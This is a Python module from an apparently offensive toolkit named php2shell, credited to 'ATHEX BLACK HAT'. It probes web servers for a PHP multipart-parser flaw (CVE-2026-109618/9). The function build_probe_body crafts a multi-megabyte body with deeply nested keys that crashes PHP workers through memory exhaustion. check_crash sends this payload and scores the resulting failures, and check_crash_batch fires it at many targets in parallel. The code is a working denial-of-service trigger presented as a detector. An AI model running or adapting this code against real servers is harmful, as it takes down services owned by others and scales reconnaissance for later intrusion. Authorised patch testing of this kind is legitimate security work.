#!/usr/bin/env python3
"""
modules/crash.py — PHP multipart-parser crash detection (CVE-2026-109618/9)
Author: ATHEX BLACK HAT

Yeh module original php2shell ka core detection logic hai:
  - Deeply nested multipart keys (NESTED_KEYS=62) + large body
  - Detect PHP parser crash (memory exhaustion / worker death)
  - Corroborate with X-Powered-By version check
  - Multi-signal verdict: VULNERABLE / FIXED / NO SIGNAL / INCONCLUSIVE

Signals (from strongest to weakest):
  1. In-band PHP fatal error ("Allowed memory size of X bytes exhausted in Unknown")
  2. HTTP 500 with empty body while control produced output
  3. HTTP 502/503/504 (FPM worker died mid-request)
  4. HTTP 200 empty body while control produced output (worker died)
  5. Consistent crash across retries (2+ hits = strong)
  6. X-Powered-By version < fixed_patch
"""

from __future__ import annotations

import re
import time
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlsplit, urlunsplit

from core.config import (
    CONTROL_BODY,
    CONTROL_BOUNDARY,
    PROBE_BOUNDARY,
    NESTED_KEYS,
    PROBES,
    REJECTED_STATUSES,
    DEAD_WORKER_STATUSES,
    FIXED_VERSIONS,
    VERSION_PATTERN,
    DEFAULT_PATH,
    PHPMYADMIN_PATH,
    PHPMYADMIN_MARKER,
    DEFAULT_TIMEOUT,
    SENSITIVE_HEADERS,
)
from core.http import (
    HTTPResult,
    send_request,
    ProxyConfig,
    redact_headers,
)
from core.logger import Logger


# ═══════════════════════════════════════════════════════════════════════════
#  DATA TYPES
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class CrashProbe:
    """One probe attempt with all relevant metadata."""
    index: int
    size_mib: int
    parts: int
    nested_keys: int
    status_code: Optional[int] = None
    reason: str = ""
    response_bytes: int = 0
    bytes_sent: int = 0
    elapsed_ms: float = 0.0
    error: Optional[str] = None
    body_snippet: str = ""

    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class CrashResult:
    """
    Final result of crash module. `vulnerable` is the authoritative verdict:
      True  → VULNERABLE (high confidence)
      False → NOT VULNERABLE (FIXED or NO SIGNAL)
      None  → INCONCLUSIVE / ERROR
    """
    # Verdict
    vulnerable: Optional[bool] = None
    verdict: str = "ERROR"     # VULNERABLE | FIXED | NO SIGNAL | INCONCLUSIVE | ERROR
    sapi: Optional[str] = None  # PHP-FPM | mod_php | mod_php/PHP-FPM | unknown
    reason: str = ""
    confidence: str = "none"    # high | medium | low | none

    # Detection evidence
    version: Optional[str] = None        # from X-Powered-By
    version_verdict: Optional[str] = None  # FIXED | VULNERABLE | None
    server: Optional[str] = None
    signals: List[str] = field(default_factory=list)
    crash_count: int = 0                 # how many probes crashed

    # Probe trail
    control: Optional[dict] = None
    probes: List[CrashProbe] = field(default_factory=list)

    # HTTP-level
    final_url: Optional[str] = None
    retargeted: bool = False
    total_elapsed_ms: float = 0.0

    # Error
    error: Optional[str] = None

    def to_dict(self) -> dict:
        d = asdict(self)
        d["probes"] = [p.to_dict() if isinstance(p, CrashProbe) else p
                       for p in self.probes]
        return d


# ═══════════════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════════════

def build_probe_body(size_mib: int, parts: int) -> bytes:
    """
    Build a multipart body that triggers deep nesting in PHP's parser.

    Structure:
      --\\nContent-Disposition:name=a[a][a]...[a];filename=\\n\\n
      ...repeated `parts` times, padded to `size_mib` MiB with junk headers.

    The `--` prefix (not `--<boundary>`) is intentional: it forces PHP to
    attempt parsing the multipart structure, triggering the nested-key
    recursion in the CVE-affected versions.
    """
    size = size_mib << 20  # MiB → bytes
    name = b"a[]" + (b"[a]" * NESTED_KEYS)
    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
    base = part * parts
    if size < len(base):
        raise ValueError(
            f"probe size {size} bytes too small to hold {parts} parts "
            f"({len(base)} bytes needed)"
        )
    filler = (size - len(base)) // 3
    body = b"--\n" + (b"x:\n" * filler) + base[3:]
    return body[:-1]


def build_control_headers(custom_headers: Dict[str, str]) -> Dict[str, str]:
    """Headers for the minimal control request."""
    return {
        **custom_headers,
        "Content-Type": f"multipart/form-data; boundary={CONTROL_BOUNDARY}",
        "Connection": "close",
    }


def build_probe_headers(custom_headers: Dict[str, str]) -> Dict[str, str]:
    """Headers for the crash probe (empty boundary — intentional)."""
    return {
        **custom_headers,
        "Content-Type": f"multipart/form-data; boundary={PROBE_BOUNDARY}",
        "Connection": "close",
    }


def extract_version(powered_by: str) -> Optional[str]:
    """Extract 'PHP/x.y.z' from X-Powered-By value."""
    if not powered_by:
        return None
    match = re.search(r"PHP/\d+\.\d+\.\d+", powered_by, re.IGNORECASE)
    return match.group(0) if match else None


def version_verdict(powered_by: str) -> Optional[str]:
    """
    Compare reported PHP version against fixed-versions table.
    Returns 'FIXED', 'VULNERABLE', or None (unknown version).
    """
    if not powered_by:
        return None
    match = re.search(VERSION_PATTERN, powered_by)
    if not match:
        return None
    major, minor, patch = (int(x) for x in match.groups())
    fixed_patch = FIXED_VERSIONS.get((major, minor))
    if fixed_patch is None:
        return None
    return "FIXED" if patch >= fixed_patch else "VULNERABLE"


def detect_sapi(server_header: str, powered_by: str) -> str:
    """Best-effort SAPI guess from headers (before we have crash data)."""
    s = (server_header or "").lower()
    p = (powered_by or "").lower()
    # Both usually include "php" so can't distinguish FPM vs mod_php from headers alone
    if "fpm" in s or "fpm" in p:
        return "PHP-FPM"
    if "apache" in s:
        return "mod_php"
    if "nginx" in s or "caddy" in s or "envoy" in s:
        return "PHP-FPM"  # nginx/caddy usually proxy to FPM
    return "unknown"


def _looks_like_memory_error(body: bytes) -> bool:
    """Check for PHP 'Allowed memory size ... exhausted' error string."""
    if not body:
        return False
    return (
        b"Allowed memory size of " in body
        and b" bytes exhausted" in body
        and (b"Unknown" in body or b"in Unknown on line" in body)
    )


def _looks_like_waf_block(result: HTTPResult) -> bool:
    """Detect WAF/IPS block page (so we don't misread it as a crash)."""
    if result.status_code in REJECTED_STATUSES:
        return True
    if result.status_code == 403:
        return True
    # Some WAFs return 200 with a block page
    body = result.body_text.lower()
    block_phrases = (
        "access denied", "request blocked", "you have been blocked",
        "web application firewall", "suspicious activity",
        "blocked by", "security policy",
    )
    return any(p in body for p in block_phrases)


def _is_empty_response(result: HTTPResult) -> bool:
    """True if response has no body AND was successfully received."""
    return (
        result.error is None
        and result.status_code is not None
        and len(result.body) == 0
    )


# ═══════════════════════════════════════════════════════════════════════════
#  SIGNAL ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class Signal:
    """A single crash signal with weight for confidence scoring."""
    name: str
    description: str
    weight: int  # 1-10 (higher = stronger)


def analyze_crash_signals(
    control: HTTPResult,
    probe: HTTPResult,
    sapi_hint: str,
) -> List[Signal]:
    """
    Compare probe vs control to determine if this probe looks like a crash.

    Returns list of Signal objects. Empty list = no crash signal.
    """
    signals: List[Signal] = []

    # ── Skip WAF blocks entirely ──
    if _looks_like_waf_block(probe):
        return []

    # ── Signal 1: In-band memory exhaustion (STRONGEST) ──
    if _looks_like_memory_error(probe.body):
        signals.append(Signal(
            name="memory_error_in_band",
            description=(
                "PHP fatal error 'Allowed memory size exhausted in Unknown' "
                "while parsing multipart body"
            ),
            weight=10,
        ))

    # ── Signal 2: HTTP 500 with empty body (control had output) ──
    if (
        probe.status_code == 500
        and _is_empty_response(probe)
        and control.error is None
        and len(control.body) > 0
    ):
        signals.append(Signal(
            name="500_empty_body",
            description=(
                "HTTP 500 with empty body although control request produced "
                f"{len(control.body)} bytes of output"
            ),
            weight=7,
        ))

    # ── Signal 3: 502/503/504 (FPM worker died) — only for FPM SAPI ──
    if sapi_hint != "mod_php" and probe.status_code in DEAD_WORKER_STATUSES:
        signals.append(Signal(
            name="dead_worker_status",
            description=(
                f"HTTP {probe.status_code} from web server fronting PHP-FPM "
                "(worker died mid-request)"
            ),
            weight=8,
        ))

    # ── Signal 4: HTTP 200 but empty body while control had output ──
    if (
        sapi_hint != "mod_php"
        and probe.status_code == 200
        and _is_empty_response(probe)
        and control.error is None
        and len(control.body) > 0
    ):
        signals.append(Signal(
            name="200_empty_body",
            description=(
                "HTTP 200 with empty body although control request produced "
                f"{len(control.body)} bytes (worker died mid-request)"
            ),
            weight=6,
        ))

    # ── Signal 5: Response dramatically smaller (crash on partial output) ──
    if (
        control.error is None
        and probe.error is None
        and len(control.body) > 100
        and 0 < len(probe.body) < len(control.body) // 10
    ):
        signals.append(Signal(
            name="truncated_response",
            description=(
                f"Probe response is {len(probe.body)}B vs control "
                f"{len(control.body)}B — possible mid-parse crash"
            ),
            weight=3,
        ))

    return signals


def compute_confidence(
    signals: List[Signal],
    crash_count: int,
    total_probes: int,
    version_by: Optional[str],
) -> Tuple[str, str]:
    """
    Compute overall confidence from signal weights + retry consistency.

    Returns (confidence_label, reasoning).
    """
    if not signals:
        return "none", "no signals"

    total_weight = sum(s.weight for s in signals)
    reasons = []

    # Boost confidence for repeated crashes
    if crash_count >= 2:
        total_weight += 5
        reasons.append(f"crash reproduced {crash_count}/{total_probes} times")
    elif crash_count == 1:
        reasons.append("crash observed once")

    # Version corroboration
    if version_by == "VULNERABLE":
        total_weight += 3
        reasons.append("X-Powered-By confirms unpatched version")
    elif version_by == "FIXED":
        total_weight -= 5
        reasons.append("X-Powered-By reports patched version (contradicts crash)")

    # Map to confidence
    if total_weight >= 15:
        label = "high"
    elif total_weight >= 8:
        label = "medium"
    elif total_weight >= 3:
        label = "low"
    else:
        label = "none"

    return label, "; ".join(reasons) if reasons else "signal weight only"


# ═══════════════════════════════════════════════════════════════════════════
#  CONTROL REQUEST
# ═══════════════════════════════════════════════════════════════════════════

def _send_control(
    target_url: str,
    custom_headers: Dict[str, str],
    timeout: float,
    verify_ssl: bool,
    follow_redirects: bool,
    proxy: Optional[ProxyConfig],
    retries: int,
) -> HTTPResult:
    """Send the minimal control request (multipart, no crash trigger)."""
    headers = build_control_headers(custom_headers)
    Logger.info(
        f"Sending control request ({len(CONTROL_BODY)}B multipart)",
        module="crash",
    )
    return send_request(
        target_url,
        method="POST",
        body=CONTROL_BODY,
        headers=headers,
        timeout=timeout,
        verify_ssl=verify_ssl,
        follow_redirects=follow_redirects,
        proxy=proxy,
        retries=retries,
        rate_limit=True,
    )


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN ENTRY
# ═══════════════════════════════════════════════════════════════════════════

def check_crash(
    target_url: str,
    custom_headers: Optional[Dict[str, str]] = None,
    timeout: float = DEFAULT_TIMEOUT,
    verify_ssl: bool = True,
    follow_redirects: bool = False,
    sapi_hint: str = "auto",
    proxy: Optional[ProxyConfig] = None,
    retries: int = 1,
    probe_retries: int = 1,
) -> CrashResult:
    """
    Run the full crash detection pipeline against a target URL.

    Args:
        target_url: Full URL (must include http:// or https://)
        custom_headers: User-supplied headers (merged into each request)
        timeout: Per-request timeout (seconds)
        verify_ssl: Verify TLS certificates
        follow_redirects: Follow 3xx redirects
        sapi_hint: 'auto' | 'mod_php' | 'fpm' — affects verdict rules
        proxy: Optional ProxyConfig
        retries: Network-level retries per request
        probe_retries: Extra probe attempts when a crash is observed
                       (for corroboration — reduces false positives)

    Returns:
        CrashResult with verdict + full evidence trail.
    """
    started = time.perf_counter()
    result = CrashResult()
    custom_headers = custom_headers or {}

    # ── Validate URL ──
    parsed = urlsplit(target_url)
    if not parsed.hostname:
        result.error = "invalid URL: no hostname"
        result.reason = result.error
        return result

    result.final_url = target_url

    # ── Control request ──
    control = _send_control(
        target_url, custom_headers, timeout, verify_ssl,
        follow_redirects, proxy, retries,
    )
    result.control = {
        "status_code": control.status_code,
        "response_bytes": len(control.body),
        "bytes_sent": control.bytes_sent,
        "elapsed_ms": round(control.elapsed * 1000, 1),
        "error": control.error,
        "server": control.server or None,
        "powered_by": control.powered_by or None,
    }

    if control.error:
        result.error = f"control request failed: {control.error}"
        result.reason = result.error
        result.verdict = "ERROR"
        result.total_elapsed_ms = round((time.perf_counter() - started) * 1000, 1)
        Logger.error(result.error, module="crash")
        return result

    if control.status_code is not None and control.status_code >= 500:
        result.verdict = "INCONCLUSIVE"
        result.error = f"control returned HTTP {control.status_code} (target unhealthy)"
        result.reason = result.error
        result.total_elapsed_ms = round((time.perf_counter() - started) * 1000, 1)
        Logger.warning(result.error, module="crash")
        return result

    # ── Extract baseline metadata ──
    server = control.server
    powered_by = control.powered_by
    version = extract_version(powered_by)
    version_by = version_verdict(powered_by)
    detected_sapi = detect_sapi(server, powered_by)

    # User hint overrides auto-detect
    effective_sapi = detected_sapi if sapi_hint == "auto" else sapi_hint

    result.server = server or None
    result.version = version
    result.version_verdict = version_by

    Logger.info(
        f"Baseline: server={server or '?'} powered_by={powered_by or '?'} "
        f"sapi={effective_sapi} version={version or '?'} "
        f"version_verdict={version_by or '?'}",
        module="crash",
    )

    # ── phpMyAdmin retarget ──
    if PHPMYADMIN_MARKER in control.body:
        new_url = urlunsplit(
            (parsed.scheme, parsed.netloc, PHPMYADMIN_PATH, "", "")
        )
        Logger.warning(
            f"phpMyAdmin detected in control response — retargeting to {PHPMYADMIN_PATH}",
            module="crash",
        )
        result.retargeted = True
        result.final_url = new_url
        # Re-run control against new URL
        control = _send_control(
            new_url, custom_headers, timeout, verify_ssl,
            follow_redirects, proxy, retries,
        )
        result.control = {
            "status_code": control.status_code,
            "response_bytes": len(control.body),
            "bytes_sent": control.bytes_sent,
            "elapsed_ms": round(control.elapsed * 1000, 1),
            "error": control.error,
            "server": control.server or None,
            "powered_by": control.powered_by or None,
        }
        if control.error or (control.status_code and control.status_code >= 500):
            result.verdict = "INCONCLUSIVE"
            result.error = (
                f"phpMyAdmin control failed: "
                f"{control.error or f'HTTP {control.status_code}'}"
            )
            result.reason = result.error
            result.total_elapsed_ms = round((time.perf_counter() - started) * 1000, 1)
            return result
        # Refresh version info
        powered_by = control.powered_by or powered_by
        server = control.server or server
        version = extract_version(powered_by)
        version_by = version_verdict(powered_by)
        result.server = server or None
        result.version = version
        result.version_verdict = version_by
        target_url = new_url

    # ── Probe loop ──
    crash_count = 0
    first_crash_index: Optional[int] = None
    first_crash_signals: List[Signal] = []
    rejected_reason: Optional[str] = None

    for i, (size_mib, parts) in enumerate(PROBES, start=1):
        # Build body
        try:
            body = build_probe_body(size_mib, parts)
        except ValueError as exc:
            Logger.error(f"Cannot build probe {i}: {exc}", module="crash")
            result.error = f"probe build failed: {exc}"
            result.verdict = "ERROR"
            break

        headers = build_probe_headers(custom_headers)
        Logger.payload(
            f"Probe {i}/{len(PROBES)} → {size_mib} MiB, {parts} parts, "
            f"{NESTED_KEYS} nested keys",
            module="crash",
        )

        probe_http = send_request(
            target_url,
            method="POST",
            body=body,
            headers=headers,
            timeout=timeout,
            verify_ssl=verify_ssl,
            follow_redirects=follow_redirects,
            proxy=proxy,
            retries=retries,
            rate_limit=True,
        )

        probe_meta = CrashProbe(
            index=i,
            size_mib=size_mib,
            parts=parts,
            nested_keys=NESTED_KEYS,
            status_code=probe_http.status_code,
            reason=probe_http.reason,
            response_bytes=len(probe_http.body),
            bytes_sent=probe_http.bytes_sent,
            elapsed_ms=round(probe_http.elapsed * 1000, 1),
            error=probe_http.error,
            body_snippet=probe_http.body_text[:512] if probe_http.body else "",
        )
        result.probes.append(probe_meta)

        # Network failure
        if probe_http.error:
            Logger.warning(
                f"Probe {i} transport error: {probe_http.error}",
                module="crash",
            )
            # If we already have a crash, this is inconclusive reinforcement
            if crash_count > 0:
                continue
            result.verdict = "INCONCLUSIVE"
            result.error = f"probe {i} failed: {probe_http.error}"
            result.reason = result.error
            break

        # Rejected by WAF/proxy (body never reached PHP)
        if probe_http.status_code in REJECTED_STATUSES:
            rejected_reason = (
                f"probe {i} rejected with HTTP {probe_http.status_code} "
                "before PHP parsed it (WAF/proxy)"
            )
            Logger.warning(rejected_reason, module="crash")
            break

        # Analyze crash signals
        signals = analyze_crash_signals(control, probe_http, effective_sapi)

        if signals:
            crash_count += 1
            for sig in signals:
                Logger.warning(
                    f"Probe {i} signal: {sig.name} (weight {sig.weight}) — "
                    f"{sig.description}",
                    module="crash",
                )
                result.signals.append(f"probe{i}:{sig.name}")

            if first_crash_index is None:
                first_crash_index = i
                first_crash_signals = signals

            # Corroboration: retry same probe N times to confirm
            if probe_retries > 0 and crash_count == 1:
                Logger.info(
                    f"Crash signal detected on probe {i}; "
                    f"retrying {probe_retries}x for corroboration",
                    module="crash",
                )
                for r in range(probe_retries):
                    retry_http = send_request(
                        target_url,
                        method="POST",
                        body=body,
                        headers=headers,
                        timeout=timeout,
                        verify_ssl=verify_ssl,
                        follow_redirects=follow_redirects,
                        proxy=proxy,
                        retries=retries,
                        rate_limit=True,
                    )
                    retry_signals = analyze_crash_signals(
                        control, retry_http, effective_sapi
                    )
                    if retry_signals:
                        crash_count += 1
                        Logger.warning(
                            f"Probe {i} retry {r+1}/{probe_retries}: "
                            f"crash confirmed ({retry_signals[0].name})",
                            module="crash",
                        )
                        result.signals.append(
                            f"probe{i}_retry{r+1}:{retry_signals[0].name}"
                        )
                    else:
                        Logger.info(
                            f"Probe {i} retry {r+1}/{probe_retries}: no crash "
                            f"(HTTP {retry_http.status_code}, "
                            f"{len(retry_http.body)}B)",
                            module="crash",
                        )

            # Early exit: if version says patched AND we only got weak signals,
            # trust the version.
            if version_by == "FIXED" and all(s.weight < 7 for s in signals):
                Logger.info(
                    "Version reports patched and only weak signals — treating as FIXED",
                    module="crash",
                )
                break

            # Otherwise keep going to try bigger probes for corroboration
            continue

        # No signal on this probe
        Logger.info(
            f"Probe {i} response: HTTP {probe_http.status_code}, "
            f"{len(probe_http.body)}B, {probe_http.elapsed*1000:.0f}ms — no crash",
            module="crash",
        )

        # Early exit: version reports FIXED and no crash → definitely FIXED
        if version_by == "FIXED":
            Logger.fixed(
                f"X-Powered-By reports patched release: {powered_by}",
                module="crash",
            )
            break

    # ── Verdict computation ──
    result.crash_count = crash_count
    result.total_elapsed_ms = round((time.perf_counter() - started) * 1000, 1)

    if crash_count > 0:
        # We have at least one crash signal
        confidence, reasoning = compute_confidence(
            first_crash_signals, crash_count, len(result.probes), version_by,
        )
        result.confidence = confidence
        result.vulnerable = True
        result.verdict = "VULNERABLE"
        result.sapi = (
            "unknown" if effective_sapi == "auto" or effective_sapi == "unknown"
            else effective_sapi
        )
        # Build reason
        signal_names = ", ".join(sorted({s.name for s in first_crash_signals}))
        result.reason = (
            f"probe {first_crash_index} ({first_crash_signals[0].description}); "
            f"signals: {signal_names}; confidence: {confidence}"
        )
        if reasoning:
            result.reason += f"; {reasoning}"
        Logger.vuln(
            f"VULNERABLE (sapi={result.sapi}, confidence={confidence}): "
            f"{result.reason}",
            module="crash",
        )
        return result

    # No crash signals
    if version_by == "VULNERABLE":
        result.vulnerable = True
        result.verdict = "VULNERABLE"
        result.sapi = "unknown" if effective_sapi in ("auto", "unknown") else effective_sapi
        result.confidence = "medium"  # version-only, no active crash
        result.reason = (
            f"no crash observed, but X-Powered-By reports unpatched "
            f"release: {powered_by}"
        )
        Logger.vuln(
            f"VULNERABLE (version-only, confidence=medium): {result.reason}",
            module="crash",
        )
        return result

    if version_by == "FIXED":
        result.vulnerable = False
        result.verdict = "FIXED"
        result.confidence = "high"
        result.reason = (
            f"no crash observed; X-Powered-By reports patched release: "
            f"{powered_by}"
        )
        Logger.fixed(result.reason, module="crash")
        return result

    if rejected_reason:
        result.verdict = "INCONCLUSIVE"
        result.confidence = "low"
        result.error = rejected_reason
        result.reason = rejected_reason
        Logger.warning(rejected_reason, module="crash")
        return result

    # Nothing to go on
    result.vulnerable = False
    result.verdict = "NO SIGNAL"
    result.confidence = "low"
    result.reason = (
        "no crash observed and no PHP version advertised in X-Powered-By"
    )
    Logger.info(result.reason, module="crash")
    return result


# ═══════════════════════════════════════════════════════════════════════════
#  CONVENIENCE: batch scan
# ═══════════════════════════════════════════════════════════════════════════

def check_crash_batch(
    targets: List[str],
    max_workers: int = 10,
    **kwargs,
) -> List[CrashResult]:
    """
    Scan multiple targets in parallel.

    Caller should handle ThreadPoolExecutor cleanup; this is a convenience.
    """
    from concurrent.futures import ThreadPoolExecutor, as_completed

    results: List[CrashResult] = []
    progress = Logger.progress(total=len(targets), desc="Crash scan", unit="target")
    try:
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = {ex.submit(check_crash, t, **kwargs): t for t in targets}
            for fut in as_completed(futures):
                target = futures[fut]
                try:
                    r = fut.result()
                except Exception as exc:
                    Logger.error(
                        f"Unexpected error on {target}: {exc}",
                        module="crash",
                    )
                    r = CrashResult()
                    r.error = str(exc)
                    r.reason = r.error
                results.append(r)
                progress.update(1)
    finally:
        progress.close()
    return results


# ═══════════════════════════════════════════════════════════════════════════
#  EXPORTS
# ═══════════════════════════════════════════════════════════════════════════

__all__ = [
    "CrashResult",
    "CrashProbe",
    "Signal",
    "check_crash",
    "check_crash_batch",
    "build_probe_body",
    "analyze_crash_signals",
    "version_verdict",
    "extract_version",
    "detect_sapi",
    "compute_confidence",
]